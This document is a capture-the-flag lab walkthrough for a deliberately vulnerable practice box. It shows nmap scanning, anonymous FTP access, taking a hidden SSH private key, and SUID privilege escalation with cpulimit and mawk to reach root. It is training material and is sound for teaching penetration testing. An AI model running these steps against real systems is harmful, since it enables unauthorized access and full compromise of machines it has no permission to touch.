# AM-02: Wellness Observation Center — Player Walkthrough

> **Difficulty:** Easy
> **Services:** FTP (port 21), SSH (port 22), HTTP (port 8080)
> **Flags:** User flag + Root flag
> **Skills learned:** Nmap enumeration, anonymous FTP access, hidden directory discovery, SSH key theft, SUID binary privilege escalation

This walkthrough teaches you how to compromise the Wellness Observation Center. You'll learn about anonymous FTP, finding hidden files, and exploiting SUID binaries — all essential CTF skills.

---

## Prerequisites

- A Kali Linux VM (or any Linux machine with nmap, ftp, ssh, and find installed)
- The target machine running and accessible (dev ports: `2121` for FTP, `2223` for SSH, `8080` for HTTP; production: standard ports at `10.10.1.20`)

---

## Stage 1 — Reconnaissance with Nmap

**Goal:** Discover what services are running on the target.

```bash
nmap -sV -sC localhost
```

**Expected output (dev ports):**
```
21/tcp   open  ftp     vsftpd (anonymous login enabled)
22/tcp   open  ssh     OpenSSH
8080/tcp open  http    Apache
```

**What we learned:** Three services:
- **Port 21 (FTP):** A file transfer server with **anonymous login enabled** — anyone can connect without a password
- **Port 22 (SSH):** An SSH server — but we need a key or password to log in
- **Port 8080 (HTTP):** A web server — let's check what's on it

---

## Stage 2 — HTTP Decoy (Misdirection)

**Goal:** Check the web server for useful information.

```bash
curl http://localhost:8080/
```

**Expected output:**
```
Citizens are reminded that the Wellness Observation Center does not exist.
This facility does not exist. Please proceed.
```

![[AM-02_HomeScreen.png]]

**What we learned:** This is a **rabbit hole** — a decoy page with no useful information or vulnerabilities. In CTF, not every service leads somewhere. The HTTP server is here to distract you. The real entry point is FTP.

**Why this matters:** Learning to recognize rabbit holes saves time. Don't spend too long on a dead end — move to the next service.

---

## Stage 3 — Anonymous FTP Access

**Goal:** Connect to the FTP server anonymously and look for files.

**What is anonymous FTP?** Some FTP servers allow anyone to log in with the username `anonymous` and any password (often blank or your email). This is common for public file servers but can expose sensitive files if misconfigured.

```bash
ftp localhost
# Username: anonymous
# Password: (press Enter — leave blank)
```

Once connected, list the files:

```ftp
ftp> ls
drwxr-xr-x  public/

ftp> cd public
ftp> ls
notice.txt

ftp> cat notice.txt
# (or: get notice.txt, then read it locally)
```

The notice is flavor text. But let's look for **hidden files** — files and directories that start with a dot (`.`) are hidden by default in Linux:

```ftp
ftp> ls -la
drwxr-xr-x  .wellness/

ftp> cd .wellness
ftp> ls
id_rsa
```

**What is `id_rsa`?** It's a **private SSH key**. If we download it, we can use it to log in via SSH as whoever owns this key.

```ftp
ftp> get id_rsa
ftp> bye
```

Make the key file usable (SSH requires private keys to have restricted permissions):

```bash
chmod 600 id_rsa
```

**What we learned:** We found a hidden directory (`.wellness/`) containing an SSH private key. The key was hidden to reward thorough enumeration.

---

## Stage 4 — SSH Lateral Movement + User Flag

**Goal:** Use the stolen SSH key to log in and find the user flag.

```bash
ssh -i id_rsa -p 2223 wellness@localhost
```

**What does `-i id_rsa` do?** It tells SSH to use the specified key file for authentication instead of a password.

Once logged in, read the user flag:

```bash
cat ~/user.txt
```

**Expected output:**
```
DZ{user_wellness_PLACEHOLDER}
```

**What we learned:** We moved from FTP access to a full SSH shell by finding and stealing a private key. This is a common CTF pattern: find credentials in one service, use them in another.

---

## Stage 5 — SUID Binary Enumeration

**Goal:** Find SUID binaries that can be exploited for privilege escalation.

**What is SUID?** SUID (Set User ID) is a Linux file permission that makes a program run as the file's owner instead of the person running it. If a binary is owned by root and has the SUID bit set, it runs as root. If that binary has a vulnerability or can be made to run arbitrary commands, we can escalate to root.

Search for all SUID files on the system:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**What does this command do?**
- `find /` — search the entire filesystem
- `-perm -4000` — find files with the SUID bit set (4000 is the numeric code for SUID)
- `-type f` — only find regular files (not directories)
- `2>/dev/null` — suppress error messages (permission denied on directories we can't read)

**Expected output (interesting entries):**
```
/usr/bin/cpulimit
/usr/bin/mawk
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
```

The standard binaries (`sudo`, `su`, `mount`, `umount`) are normal. But `cpulimit` and `mawk` are **not** standard SUID binaries — they were intentionally set up as privesc vectors.

---

## Stage 6 — Privilege Escalation via cpulimit

**Goal:** Use the SUID `cpulimit` binary to get a root shell.

**What is cpulimit?** It's a tool that limits the CPU usage of a process. With the SUID bit set, it runs as root. We can abuse its `-f` flag (which forks a command) to run arbitrary commands as root.

```bash
/usr/bin/cpulimit -l 100 -f chmod +s /bin/bash
```

**What this does:**
- `-l 100` — allow 100% CPU (no actual throttling)
- `-f chmod +s /bin/bash` — fork the `chmod +s /bin/bash` command, which sets the SUID bit on `/bin/bash`

Now `/bin/bash` itself is SUID root. Run it with the `-p` flag (which preserves the effective user ID):

```bash
/bin/bash -p
```

**What does `-p` do?** Without `-p`, bash drops SUID privileges for security. With `-p`, bash keeps the effective user ID — so you get a root shell.

Verify you're root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /root/root.txt
```

**Expected output:**
```
DZ{root_wellness_PLACEHOLDER}
```

---

## Stage 6b — Alternate Path: mawk (Direct Flag Read)

There's a second SUID binary: `mawk` (a text processing tool). Since it runs as root, it can read any file:

```bash
/usr/bin/mawk '//' /root/root.txt
```

**What does this do?** `mawk '//'` prints every line that matches the empty regex (which matches everything). So it prints the entire contents of the root flag file — as root.

This doesn't give you a root shell, but it reads the flag directly. Either path works.

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Discovered FTP (21), SSH (22), HTTP (8080) |
| 2 | Recognized decoy | HTTP 8080 was a rabbit hole — moved to FTP |
| 3 | Anonymous FTP | Connected with `anonymous` login |
| 4 | Hidden file discovery | Found `.wellness/id_rsa` using `ls -la` |
| 5 | SSH key login | Used the stolen key to log in as `wellness`, got user flag |
| 6 | SUID enumeration | Found non-standard SUID binaries: `cpulimit`, `mawk` |
| 7 | SUID privesc | Used `cpulimit` to set SUID on `/bin/bash`, got root flag |

**Key takeaways:**
- **Anonymous FTP is a goldmine.** Always connect and explore, including hidden files (`ls -la`).
- **Hidden files start with a dot.** Use `ls -la` everywhere — not just `ls`.
- **SUID binaries are a key privesc vector.** Run `find / -perm -4000 -type f 2>/dev/null` on every box.
- **Check GTFOBins.** The website [gtfobins.github.io](https://gtfobins.github.io) lists Unix binaries that can be abused for privilege escalation. Look up any unusual SUID binary there.
- **Not every service is a real target.** Learn to recognize rabbit holes and move on quickly.
